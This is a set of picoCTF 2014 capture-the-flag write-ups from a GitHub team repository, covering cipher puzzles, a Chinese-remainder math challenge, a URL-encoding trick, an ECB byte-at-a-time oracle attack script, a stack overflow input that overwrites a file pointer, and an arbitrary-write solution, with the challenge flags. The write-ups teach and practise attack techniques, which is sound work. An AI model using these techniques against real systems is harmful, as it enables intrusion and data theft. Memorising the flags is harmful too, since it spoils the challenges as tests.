{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/substitution.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/substitution.md", "content": "### Solved by superkojiman\n\nSubstitution is a 50 point cryptography challenge. This is another one of the easy ones. \n\n> There's an authorization code for some Thyrin Labs information here, along with someone's favorite song. But it's been encrypted! Find the authorization code.\n\nThe encrypted text in question looks like this:\n\n```\ntep yhteszxdytxsj rsbp xo yuesgpjpuuszgb\n\nx ryj oesu fsh tep uszgb\noexjxjk oexccpzxjk ongpjbxb\ntpgg cp nzxjrpoo jsu uepj bxb\nfsh gyot gpt fshz epyzt bprxbp\n\nx ryj snpj fshz pfpo\ntyap fsh usjbpz qf usjbpz\nslpz oxbpuyfo yjb hjbpz\nsj y cykxr ryznpt zxbp\n\ny uesgp jpu uszgb\ny jpu iyjtyotxr nsxjt si lxpu\njs sjp ts tpgg ho js\nsz uepzp ts ks\nsz oyf upzp sjgf bzpycxjk\n\ny uesgp jpu uszgb\ny byddgxjk ngyrp x jplpz ajpu\nqht jsu izsc uyf hn epzp\nxto rzfotyg rgpyz\nteyt jsu xc xj y uesgp jpu uszgb uxte fsh\n\nhjqpgxplyqgp oxketo\nxjbporzxqyqgp ippgxjk\nosyzxjk thcqgxjk izppueppgxjk\ntezshke yj pjbgpoo bxycsjb oaf\n\ny uesgp jpu uszgb\nbsjt fsh byzp rgsop fshz pfpo\ny ehjbzpb teshoyjb texjko ts opp\nesgb fshz qzpyte  xt kpto qpttpz\nxc gxap y oesstxjk otyz\nxlp rscp os iyz\nx ryjt ks qyra ts uepzp x hopb ts qp\n\ny uesgp jpu uszgb\nplpzf thzj y ohznzxop\nuxte jpu eszxdsjo ts nhzohp\nplpzf cscpjt kpto qpttpz\nxgg reyop tepc yjfuepzp\ntepzpo txcp ts onyzp\ngpt cp oeyzp texo uesgp jpu uszgb uxte fsh\n\ny uesgp jpu uszgb\n\ny uesgp jpu uszgb\ny jpu iyjtyotxr nsxjt si lxpu\njs sjp ts tpgg ho js\nsz uepzp ts ks\nsz oyf upzp sjgf bzpycxjk\ny uesgp jpu uszgb\nplpzf thzj y ohznzxop\nuxte jpu eszxdsjo ts nhzohp\nplpzf cscpjt kpto qpttpz\nxgg reyop tepc yjfuepzp\ntepzpo txcp ts onyzp\nxgg reyop tepc yjfuepzp\ntepzpo txcp ts onyzp\ngpt cp oeyzp texo uesgp jpu uszgb uxte fsh\n\ny uesgp jpu uszgb\ny uesgp jpu uszgb\nteyto uepzp upgg qp\nteyto uepzp upgg qp\ny tezxggxjk reyop\ny usjbzsho ngyrp\nisz fsh yjb cp\n```\n\nWe know it's a substitution cipher based on the challenge's name. The fastest way to solve it was to just plug in the first few lines in [http://quipqiup.com/index.php](http://quipqiup.com/index.php). I left the clues field blank, and set it to auto-detect the puzzle. \n\n![](/images/2014/pico/substitution/01.png)\n\nIt solves it instantly. The flag is **awholenewworld**\n\n", "timestamp": "2025-10-24T11:40:18.995235"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/the-valley-of-fear.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/the-valley-of-fear.md", "content": "### Solved by et0x\n\nThe Valley of Fear is a 30 point Cryptography challenge.\n\n> The hard drive may be corrupted, but you were able to recover a small chunk of text. Scribbled on the back of the hard drive is a set of mysterious numbers. Can you discover the meaning behind these numbers? (1, 9, 4) (4, 2, 8) (4, 8, 3) (7, 1, 5) (8, 10, 1)\n\nThe text referred to contains the following:\n\n>It might have been expected that the attempt to trace to their origin\nin the past the institutions and customs in common use upon the sea\nwould from an early date occupy the attention of a seafaring people,\nbut for some obscure reason the British nation has always been\nindifferent to the history of its activities upon that element on which\nits greatness was founded, and to which it has become more and more\ndependent for its daily bread and its very existence. To those who\nare alive to this fact it will hardly come as a surprise, therefore,\nto learn that the first sustained attempt at a detailed investigation\ninto the history of the flag at sea was made under the patronage\nof the German Admiralty by a German Admiral. Vice-Admiral Siegel's\n_Die Flagge_, published in 1912, was the first book to deal with the\ndevelopment of the flag at sea in a scientific spirit, and although\nthe earlier chapters contain some mistakes due to his employment of\ntranslations of early works instead of original texts, and the accounts\nof the British flags in the later chapters suffer because he had no\naccess to original records, it is a worthy piece of work.\n  \n>The present book is an attempt to remove the reproach to the British\nnation which this implies. Its plan is somewhat different from that\nof the work referred to above. Instead of dealing with the flags of\nall maritime nations of the world--a task that (if it was to be more\nthan a mere copying or compilation) would entail much work in foreign\narchives--it seemed more profitable to concentrate upon the history\nof British Naval Flags, for researches made so far back as 1908 had\ntaught me how much that is inaccurate about their history had received\nacceptance. But first it seemed necessary to devote some time and\nspace to the inquiry into the origin of the flag and how it became the\nhonoured symbol of nationality that it now is, and for this a general\nview had to be taken in order that a firm foundation might be laid for\nthe early history of our own flags.\n\n>In the first chapter the ground worked over by Admiral Siegel has been\nsolidified by examination of the original authorities, with the result\nthat a few errors have been detected and some new facts brought to\nlight, and the investigation has also been extended further; the most\nimportant of the additions being those relating to the standards in\nthe Phoenician and Greek ships of war, forms of the early \"standard\"\nand \"gonfanon,\" and the Genoese Standard of St George and the Dragon.\nFor the deduction that the use of a national flag arose in the Italian\ncity states I take the entire responsibility, well aware that further\ninvestigations may possibly bring to light fresh facts which will\noverthrow it.\n\n>The chapter on early English, Scottish and Irish flags serves as an\nintroduction to the history of our national flag, which was invented\nfor the use of the mercantile marine, though it was very soon\nappropriated by the Royal Navy for its sole use. It is very improbable\nthat further research will enable the gap left by the unfortunate\ndestruction of the early 17th century records to be filled, so that the\nstory of the Union Flag may be taken as being substantially complete,\nbut there is still room for further work upon the history of its\ncomponent crosses. It will be seen that I have been unable to find any\nsolid ground for the common belief that the cross of St George was\nintroduced as the national emblem of England by Richard I, and am of\nopinion that it did not begin to attain that position until the first\nyears of the reign of Edward I.\n\n>The chapters on the flags used to indicate distinctions of command and\nservice at sea give an account of the use (now obsolete) of the Royal\nStandard at sea by naval commanders-in-chief; of the history of the\nAdmiralty anchor-flag; and of the steps by which the present Admirals'\nflags were evolved. The history of the ensigns from their first\nadoption at sea about the end of Elizabeth's reign has been set out in\nsome detail, but further research may bring to light more details of\ninterest in the years between 1574 and 1653. The causes which led to\nthe adoption of a red ensign as the most important British ensign and\nthe steps which led to its appropriation to the Mercantile Marine, and\nnot the Royal Navy, are stated as far as the records availed, though\nhere again further research is needed in the late Elizabethan and\nearly Stuart periods among records that may still survive in private\nownership. These chapters may, perhaps, appeal rather to the seaman\nand the student of naval history than to the general reader, but it is\nhoped that they may also prove of service to artists who wish to avoid\nthe anachronisms into which some of their brethren have been betrayed.\n\n>In order that the development of flag signals may be properly\nappreciated it has been necessary, when dealing with the earlier years,\nto take into account what had happened outside the narrow circuit of\nBritish waters. The earlier matter, though here examined solely from\nthe point of view of the flags used, offers considerable interest to\nthe student of naval tactics, with which indeed the art of signalling\nis inseparably connected.\n\n>The last chapter, on Ceremonial and other usages, is, from the author's\npoint of view, the least satisfactory. From the nature of the subject,\nthe official records contain very little information about it. It\nis only by the slow and laborious process of examining contemporary\njournals, diaries, accounts of voyages, and similar material that facts\ncan be found for any exhaustive treatment of these matters. Something\nof this has been done, but more remains to do.\n\n>In concluding the work which has occupied a large portion of the\nleisure hours of many years, it is my pleasant duty to express my\ngratitude to the numerous friends whose encouragement and assistance\nhave enabled me to persevere in what has proved a somewhat arduous\ntask; especially to Sir Julian Corbett, who has read the proofs and\ngiven me the benefit of his criticisms; to the officials of the\nPepysian Library, Public Record Office, British Museum and London\nLibrary for the facilities afforded me; and not least to my friend Mr\nVaughan who has spared no pains in the preparation of the coloured\nplates.\n\nThis appears to a book cipher and the format of the key (1, 9, 4) (4, 2, 8) (4, 8, 3) (7, 1, 5) (8, 10, 1), is first paragraph, ninth line, fourth word, fourth paragraph, second line, eighth word, etc...\n\nAfter translating, the message ends up being **The flag is ceremonial plates**\n", "timestamp": "2025-10-24T11:40:19.042234"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/tick-tock.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/tick-tock.md", "content": "### Solved by Swappage\n\nMath, math, and more math! :)\n\nThere was a loth of math in this picoCTF, and Tick Tock was a pretty cool one.\n\nThe problem was under the reverse engineering category, but it was definitely more math related then reverse engineering, as all you had to understand in terms of reversing, was what the python script was doing.\n\n<!-- more -->\n\nIf we remove all the visualization stuff, for spinning the clock all the problem revolves around these functions\n\n```python\n\tdef count(n,m,msg=\"\"):\n\t  # n % m\n\t  spin_for = min((m*10),n)\n\t  nspots = 112\n\t  for i in xrange(0,spin_for,m/nspots+1):\n\t\tspeed = 1.0/((spin_for-i)/(m/nspots+1)+1)\n\t\tprintc(clock(1+i+n-spin_for,m),msg)\n\t\ttime.sleep(speed)\n\t  if m/nspots+1 > 2:\n\t\tfor j in xrange(i,spin_for,max((spin_for-i)/50,1)):\n\t\t  printc(clock(1+j+n-spin_for,m),msg)\n\t  printc(clock(n,m),msg)\n\t  return n%m\n```\n\nthe count() function: that is nothing but a modulus operation with some ascii art :)\n\n```python\n\tdef powmod(n,p,m,msg=\"\"):\n\t  # n^p % m\n\t  for i in xrange(max(0,p-100),p+1):\n\t\tspeed = 1.0/math.sqrt(1+p-i)\n\t\tprintc(clock(pow(n,i,m),m),msg)\n\t\ttime.sleep(speed)\n\t  return pow(n,p,m)\n```\n\nand the powmod() function: which is nothing but a pow, again with some graphics for displaying the clock.\n\nthen the application does the following:\n\nit takes the first argument number we supply, it takes the list named secretz, containing 17 tuples\n\n```python\n\tsecretz = [(1, 2), (2, 3), (8, 13), (4, 29), (130, 191), (343, 397), (652, 691), (858, 1009),\n           (689, 2039), (1184, 4099), (2027, 7001), (5119, 10009), (15165, 19997), (15340, 30013),\n           (29303, 70009), (42873, 160009), (158045, 200009)]\n```\n\nand cycles over each tuple using the count() function, which as said earlier is nothing but a modulus operation.\n\n```python\n\tfor (r,m) in secretz:\n\t  if count(num,m,\"%d %% %d\"%(num,m)) != r:\n\t\tprint\n\t\tprint \"%d %% %d != %d... WRONG\"%(num,m,r)\n\t\tsys.exit(0)\n\t  else:\n\t\tprint\n\t\tprint \"%d %% %d == %d... GOOD\"%(num,m,r)\n\t\ttime.sleep(2)\n\t\tprint '\\033[2A'\n\t\tprint \" \"*90\n```\n\nit performs the modulus operation between the number we supplied and the second value of the tuple, and checks that the result of the operation matches the first value, if the result is correct it procedes to the next tuple, if it fails, it exits.\n\nfor example, if we assume that x is the first argument we submitted it checks that the following statement is true\n\n$$\n\\begin{align}\nx \\equiv 1 \\pmod{2}\n\\end{align}\n$$\n\nand if it is, it performs the check for the next tuple.\n\nSo the first part of the problem was to find a value x that would satisfy the equivalence for every tuple in the secretz list.\n\nThis problem can be solved using the *chinese remainder theorem*\nwhich can be implemented in python as follows:\n\n```python\n\t#!/usr/bin/python\n\n\tdef mul_inv(a, b):\n\t\tb0 = b\n\t\tx0, x1 = 0, 1\n\t\tif b == 1: return 1\n\t\twhile a > 1:\n\t\t\tq = a / b\n\t\t\ta, b = b, a%b\n\t\t\tx0, x1 = x1 - q * x0, x0\n\t\tif x1 < 0: x1 += b0\n\t\treturn x1\n\t \n\tdef chinese_remainder(n, a, lena):\n\t\tp = i = prod = 1; sm = 0\n\t\tfor i in range(lena): prod *= n[i]\n\t\tfor i in range(lena):\n\t\t\tp = prod / n[i]\n\t\t\tsm += a[i] * mul_inv(p, n[i]) * p\n\t\treturn sm % prod\n\t \n\tif __name__ == '__main__':\n\t\tn = [2, 3, 13, 29, 191, 397, 691, 1009, 2039, 4099, 7001, 10009, 19997, 30013, 70009, 160009, 200009]\n\t\ta = [1, 2, 8, 4, 130, 343, 652, 858, 689, 1184, 2027, 5119, 15165, 15340, 29303, 42873, 158045]\n\t\tc = chinese_remainder(n, a, len(n))\n\t\tprint c\n```\n\nOnce we find the number that satisfies the first part of the problem, the second function comes in play\n\n```python\n\tif powmod(num,num2,200009*160009,\"%d ^ %d %% %d\"%(num,num2,200009*160009)) != 1:\n\t  print\n\t  print \"%d ^ %d %% %d != 1... WRONG\"%(num,num2,200009*160009)\n\t  sys.exit(0)\n\telse:\n\t  print \"Congratulations! The flag is: %s_%s\"%(sys.argv[1],str(num2))\n```\n\nand what happens here is that the last two modulus operand of the secretz list, are multiplied one another and used as a modulus to compute the following equation\n\n$$\n\\begin{align}\nx^y \\equiv 1 \\pmod{N}\n\\end{align}\n$$\n\nwhere \n\n- x is our first argument\n- y is our second argument\n- and N is the number obtained by the multiplication said above\n\nSolving this second part is easy, because there is the *Euler's theorem* stating\n\n$$\n\\begin{align}\na^{\\phi(N)} \\equiv 1 \\pmod{N}\n\\end{align}\n$$\n\nso.. Wolfram Alpha to the rescue!\n\nlet's calculate $$\\phi(N)$$ as this will give us the correct value to submit to the program as second parameter.\n\nUnfortunately the clock script was buggy, and during the last step returned an exception, but in the end the calculated numbers were correct, and scored the flag successfully on the web site.\n\n\t83359654581036155008716649031639683153293510843035531_32002880064\n", "timestamp": "2025-10-24T11:40:19.100905"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/toastercontrol.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/toastercontrol.md", "content": "### Solved by et0x\n\nToaster Control is a 50 point web exploitation challenge. \n\n> Daedalus Corp. uses a web interface to control some of their toaster bots. It looks like they removed the command 'Shutdown & Turn Off' from the control panel. Maybe the functionality is still there... \n\nVisiting the provided link gives you an interface with three buttons, \"Blink Lights\", \"Patrol Mode\", and \"Make Toast\".  Clicking on each parses a handler php file, handler.php, with a variable, \"action\" appended, and each button performs an associated action.\n\nSo **Blink Lights** = \"/handler.php?action=Blink Lights\"\n\nThe problem says to check the functionality of \"Shutdown & Turn Off\". (note the ampersand)\n\nNow you can't simply use \"handler.php?action=Shutdown & Turn off\", because the php file will see everything after the \"&\" as more arguments for the request.  You have to url encode it, so...\n\n/handler.php?action=Shutdown %26 Turn Off\n\nSure enough it works, yielding the following:\n\nShutdown code: **flag_c49bdkeekr5zqgvc20vc**\n", "timestamp": "2025-10-24T11:40:19.146722"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/web-interception.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/web-interception.md", "content": "### Solved by barrebas and Swappage\n\nWeb Interception is a 140 point challenge. \n\n`We were able to get some code running in a Daedalus browser. \nUnfortunately we can't quite get it to send us a cookie for its internal \nlogin page ourselves... But we can make it make requests that we can see, \nand it seems to be encrypting using ECB mode. See here for more details \nabout what we can get. It's running at vuln2014.picoctf.com:65414. \nCan you get us the cookie?`\n\nSwappage and me solved this one. The program does the following:\n\n```python\ndef oracle(s):\n\t# so, this is simulated. In reality we'd have to run javascript on a target web browser\n\t# and capture the traffic. That's pretty hard to do in a way that scales, though, so we\n\t# simulate it instead.\n\t# This uses ECB mode.\n\treturn AESCipher(key).encrypt(pkcs7_pad('GET /' + s.decode('hex') + secret_data))\n```\n\nIt takes user-supplied *hex-encoded* data and then returns an encrypted ciphertext in ECB mode. We need to find secret_data. The trick here is that ECB mode will return identical ciphertexts for identical plaintexts. Furthermore, it is a block-mode encryption. This means that we can create a block, have it encrypted, and check if it is present in the returned ciphertext. If so, our block must have matched part of the secret_data. In terms of blocks, we do the following:\n\n```\n[ GET /aaaaaaaaaaa                  ] # block one, padded to 16 bytes\n[ guess_byte + pkcs7_padding        ] # block two, our guess\n[ bogus bytes + part of secret_data ] # block three, part of secret_data\n[ ...secret_data...                 ] # block four, more secret_data\n[ one byte of secret_data + padding ] # block five, we are interested in the ciphertext of this block!\n```\n\nSo if the ciphertext of our block two matches that of block five, we know that our guess was ok! We then prepend another byte to our guessed block. We add more padding to block three so that now, not one but *two* bytes of the secret_data are pushed onto block five. We repeat our guess for all possible characters and check the ciphertexts of block two and five. If they match, we have a bingo!\n\nLong story short, here's the script to bruteforce secret_data:\n\n```\n#!/usr/bin/python\n\nfrom socket import *\nimport string, time\n\ndef pkcs7_pad(s):\n  l = len(s)\n  needed = 16 - (l % 16)\n  return s + (chr(needed) * needed)\n  \ndef make_payload(guess):\t\n\tpayload = \"\"\n\t# pad string to next block\n\tpayload += \"a\"*11\t\n\t\n\t# insert guessed bytes, but first pad them\n\tblock = \"\"\n\tblock += guess\n\tblock = pkcs7_pad(block)\n\t\n\t# add guessed bytes + padding\n\tpayload += block\t\t\t\t\n\n\t# push last bytes into a new ciphertext block. The +1 was empirically determined!\n\tpayload += \"a\"*(len(guess)+1)\t\n\t\n\treturn payload\n\t\nbruteforce = \"\"\n# think the length of the plaintext is 48 bytes (3 16-byte blocks)\nwhile len(bruteforce) < 48:\n\t\n\t# we'll brute-force the entire ascii range\n\tfor in in range(0, 127)\n\t\tz = chr(i)\n\t\t\n\t\t# display progress\n\t\tprint \"[+] trying {}\".format(i)\n\t\t\n\t\t# connect to server\n\t\ts=socket(AF_INET, SOCK_STREAM)\n\t\ts.connect(('vuln2014.picoctf.com', 65414)) \n\n\t\t# banner\n\t\ttime.sleep(0.05)\n\t\ts.recv(256)\n\n\t\t# we bruteforce backwards, starting at the last byte\n\t\tpayload = make_payload(z+bruteforce)\n\t\t\n\t\t# send payload\n\t\ts.send( payload.encode('hex') )\n\n\t\tciphertext = s.recv(1024)\n\t\n\t\t# split ciphertext into 32 bytes (which are 16 bytes hex-encoded).\n\t\t# we need to look for a duplicate block. if we find a duplicate,\n\t\t# it means our guessed bytes match the end of the string.\n\t\tblocks = [ciphertext[i:i+32] for i in range(0, len(ciphertext), 32)]\n\n\t\t# check if we have the same encoded block as the guess\n\t\t# the guessed block is the second returned block, due to the \n\t\t# way the payload is built up. \n\t\tif blocks[1] in blocks[2:]:\n\t\t\tprint \"match: {}\".format(blocks[1])\n\t\t\tbruteforce = z + bruteforce\n\t\t\tprint \"[+] got {} so far\".format(bruteforce)\n\t\ts.close()\n```\n\nThe flag is `congrats_on_your_first_ecb_ecryption\\r\\n`.\n", "timestamp": "2025-10-24T11:40:19.216205"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/what-the-flag.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/what-the-flag.md", "content": "### Solved by superkojiman\n\nWhat the flag is a 140 point exploitation challenge. \n\n> This binary uses stack cookies to prevent exploitation, but all hope is not lost. Read the flag from flag.txt anyways! The binary can be found at /home/what_the_flag/ on the shell server. You can solve this problem interactively here. The source can be found here.\n\nThis challenge is interesting in that it gives us a neat interface to solve it. Here's how it looks:\n\n![](/images/2014/pico/what_the_flag/01.png)\n\nWe're given the source code for the binary:\n\n```c\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct message_data{\n    char message[128];\n    char password[16];\n    char *file_name;\n};\n\nvoid read_file(char *buf, char *file_path, size_t len){\n    FILE *file;\n    if(file= fopen(file_path, \"r\")){\n        fgets(buf, len, file);\n        fclose(file);\n    }else{\n        sprintf(buf, \"Cannot read file: %s\", file_path);\n    }\n}\n\nint main(int argc, char **argv){\n    struct message_data data;\n    data.file_name = \"not_the_flag.txt\";\n\n    puts(\"Enter your password too see the message:\");\n    gets(data.password);\n\n    if(!strcmp(data.password, \"1337_P455W0RD\")){\n        read_file(data.message, data.file_name, sizeof(data.message));\n        puts(data.message);\n    }else{\n        puts(\"Incorrect password!\");\n    }\n\n    return 0;\n}\n```\n\nWe basically need to enter the password \"1337_P455W0RD\" and and somehow manage to overwrite the file pointer so that it reads the flag. Let's see what happens when we run the program and provide the expected password:\n\n```text\npico1139@shell:/home/what_the_flag$ ./what_the_flag\nEnter your password too see the message:\n1337_P455W0RD\nCannot read file: not_the_flag.txt\n```\n\nAccording to the interactive page, we can start overwriting the file pointer by passing in another 3 bytes after the password.\n\n![](/images/2014/pico/what_the_flag/02.png)\n\nSo what should we overwrite it to? We want flag.txt, so all we need to do is find the address of flag.txt from not_the_flag.txt. \n\n```\npico1139@shell:/home/what_the_flag$ gdb -q what_the_flag\nReading symbols from what_the_flag...(no debugging symbols found)...done.\n(gdb) br *puts\nBreakpoint 1 at 0x8048460\n(gdb) x/s 0x08048777\n0x8048777:  \"not_the_flag.txt\"\n(gdb) x/s 0x0804877f\n0x804877f:  \"flag.txt\"\n```\n\nSo we'll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()'s manual:\n\n> gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte ('\\0'). No check for buffer overrun is performed (see BUGS below).\n\nSo by using the following input, we can overwrite the file pointer and still provide the correct password: \n\n```\n1337_P455W0RD\\0aa\\x7f\\x87\\x04\\x08\n```\n\nPunch it into the interactive page and we get the flag:\n\n![](/images/2014/pico/what_the_flag/03.png)\n\nThe flag is **who_needs_%eip**\n", "timestamp": "2025-10-24T11:40:19.303963"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/write_right.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/write_right.md", "content": "### Solved by et0x\n\nWrite Right is a 50 point binary exploitation challenge.\n\n\n> Can you change the secret? The binary can be found at /home/write_right/ on the shell server. The source can be found here. \n\nThe source for the binary is the following:\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <fcntl.h>\n\nunsigned secret = 0xdeadbeef;\n\nint main(int argc, char **argv){\n    unsigned *ptr;\n    unsigned value;\n\n    char key[33];\n    FILE *f;\n\n    printf(\"Welcome! I will grant you one arbitrary write!\\n\");\n    printf(\"Where do you want to write to? \");\n    scanf(\"%p\", &ptr);\n    printf(\"Okay! What do you want to write there? \");\n    scanf(\"%p\", (void **)&value);\n\n    printf(\"Writing %p to %p...\\n\", (void *)value, (void *)ptr);\n    *ptr = value;\n    printf(\"Value written!\\n\");\n\n    if (secret == 0x1337beef){\n        printf(\"Woah! You changed my secret!\\n\");\n        printf(\"I guess this means you get a flag now...\\n\");\n\n        f = fopen(\"flag.txt\", \"r\");\n        fgets(key, 32, f);\n        fclose(f);\n        puts(key);\n\n        exit(0);\n    }\n\n    printf(\"My secret is still safe! Sorry.\\n\");\n}\n```\n\nSo this program allows an arbitrary write at the location in memory you specify, in this case, the location of \"secret\".\n\nLooks like all we need to do is find the address of the variable.  Let's throw it into gdb.\n\n```bash\npico1139@shell:/home/write_right$ gdb -q write_right\nReading symbols from write_right...(no debugging symbols found)...done.\n(gdb) p &secret\n$1 = (<data variable, no debug info> *) 0x804a03c <secret>\n```\n\nOur address is **0x804a03c**. Lets put 1337beef into that location and see what happens.  \n\n```\npico1139@shell:/home/write_right$ ./write_right\nWelcome! I will grant you one arbitrary write!\nWhere do you want to write to? 804a03c\nOkay! What do you want to write there? 1337beef\nWriting 0x1337beef to 0x804a03c...\nValue written!\nWoah! You changed my secret!\nI guess this means you get a flag now...\n```\nThe flag is **arbitrary_write_is_always_right**\n\n", "timestamp": "2025-10-24T11:40:19.406468"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "2014/picoctf/zor.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/2014/picoctf/zor.md", "content": "### Solved by bitvijays\n\nZOR is a 50 point Cryptography challenge. You are provided with a encrypted file and the password encryption method in ZOR.py\n\n> Daedalus has encrypted their blueprints! Can you get us the password? \nZOR.py\nencrypted\n\n```\n#!/usr/bin/python\n\nimport sys\n\n\"\"\"\nDaedalus Corporation encryption script.\n\"\"\"\n\ndef xor(input_data, key):\n    result = \"\"\n    for ch in input_data:\n        result += chr(ord(ch) ^ key)\n\n    return result\n\ndef encrypt(input_data, password):\n    key = 0\n    for ch in password:\n        key ^= ((2 * ord(ch) + 3) & 0xff)\n\n    return xor(input_data, key)\n\ndef decrypt(input_data, password):\n    return encrypt(input_data, password)\n\ndef usage():\n    print(\"Usage: %s [encrypt/decrypt] [in_file] [out_file] [password]\" % sys.argv[0])\n    exit()\n\ndef main():\n    if len(sys.argv) < 5:\n        usage()\n\n    input_data = open(sys.argv[2], 'r').read()\n    result_data = \"\"\n\n    if sys.argv[1] == \"encrypt\":\n        result_data = encrypt(input_data, sys.argv[4])\n    elif sys.argv[1] == \"decrypt\":\n        result_data = decrypt(input_data, sys.argv[4])\n    else:\n        usage()\n\n    out_file = open(sys.argv[3], 'w')\n    out_file.write(result_data)\n    out_file.close()\n\nmain()\n```\n\nIf you see the encrypt function, key is bitwise and with 0xFF which means there are only 256 possible key combinations.\n```\ndef encrypt(input_data, password):\n    key = 0\n    for ch in password:\n        key ^= ((2 * ord(ch) + 3) & 0xff)\n    return xor(input_data, key)\n\n```\nIf we add a new function in the given ZOR.py, TEST is added just to distinguish the result of different key decryptions.\n```\ndef sol(input_data):\n    result = \"\"\n    for key in range(0,255):\n        result += xor(input_data,key)\n        result += \"  TEST  \"\n    return result \n```\nand call this function in with a new parameter\n```\n    if sys.argv[1] == \"encrypt\":\n        result_data = encrypt(input_data, sys.argv[4])\n    elif sys.argv[1] == \"decrypt\":\n        result_data = decrypt(input_data, sys.argv[4])\n    elif sys.argv[1] == \"sol\":\n        result_data = sol(input_data)\n    else:\n        usage()\n```\nFurther, we ran the script with python ZOR.py sol encrypted res.out 12. 12 is the random just to skip the check of length of parameters.\n\nThis creates a res.out file with the results of decryption from all possible keys of 0 to 255. If you manually check this file, you would find the below:\n```\nThis message is for Daedalus Corporation only. Our blueprints for the Cyborg are protected with a password. That password is b19eb1a26991e6ea6365f211ec5437\n```\nThe flag is **b19eb1a26991e6ea6365f211ec5437**\n\n", "timestamp": "2025-10-24T11:40:19.498937"}
{"source": "github", "repo": "VulnHub/CTF-Writeups", "file": "README.md", "url": "https://github.com/VulnHub/ctf-writeups/blob/master/README.md", "content": "<p align=\"center\">\n<img src=\"/images/team-logo.png\"/>\n</p>\n\nWe're a group of people who met up on [VulnHub's IRC channel](https://www.vulnhub.com/chat/), and we like to hack things. You can find us registered on [CTF Time](https://ctftime.org/team/10276). This repository hosts a collection of our write-ups from various CTFs we've competed in. \n\nHere's a list of our active team members:\n\n* superkojiman [https://blog.techorganic.com](https://blog.techorganic.com/) || [@superkojiman](https://twitter.com/superkojiman) || [VulnHub Profile](https://www.vulnhub.com/author/superkojiman,43/)\n* barrebas [https://barrebas.github.io](https://barrebas.github.io/) || [@barrebas](https://twitter.com/barrebas) || [VulnHub Profile](https://www.vulnhub.com/author/bas,58/)\n* Swappage [https://swappage.github.io](https://swappage.github.io/) || [@swappage](https://twitter.com/swappage) || [VulnHub Profile](https://www.vulnhub.com/author/swappage,85/)\n* historypeats [http://www.historypeats.com](http://www.historypeats.com/) || [@historypeats](https://twitter.com/historypeats) || [VulnHub Profile](https://www.vulnhub.com/author/historypeats,99/)\n* NullMode [https://nullmode.github.io/](https://nullmode.github.io/) || [@NullMode_](https://twitter.com/NullMode_) || [VulnHub Profile](https://www.vulnhub.com/author/nullmode,56/)\n* et0x [http://rwnin.net/](http://rwnin.net/) || [@_et0x](https://twitter.com/_et0x) || [VulnHub Profile](https://www.vulnhub.com/author/et0x,109/)\n* bitvijays [https://bitvijays.github.io/](https://bitvijays.github.io/) || [@bitvijays](https://twitter.com/bitvijays)\n* rasta_mouse [https://rastamouse.me/](https://rastamouse.me/) || [@_RastaMouse](https://twitter.com/_RastaMouse) || [VulnHub Profile](https://www.vulnhub.com/author/rasta-mouse,77/)\n\nTo submit a writeup, fork the repository, clone your fork, add your writeup, and send a pull request. For more details, check out GitHub's tutorial on [forking](https://help.github.com/articles/fork-a-repo/) and submitting a [pull](https://help.github.com/articles/using-pull-requests/) request.\n\nYou can use the following template for your write-up:\n\n```\n### Solved by <team-member>\n\nIf it doesn't already exist in the repository, go ahead and create the /<year>/<ctfname> directory and add your writeup there. \n\nTo add images, save your image to /images/<year>/<ctfname>/<challenge-name>\nEmbed images using: ![](/images/<year>/<ctfname>/<challenge-name>/img.png)\n```\n", "timestamp": "2025-10-24T11:40:41.119312"}
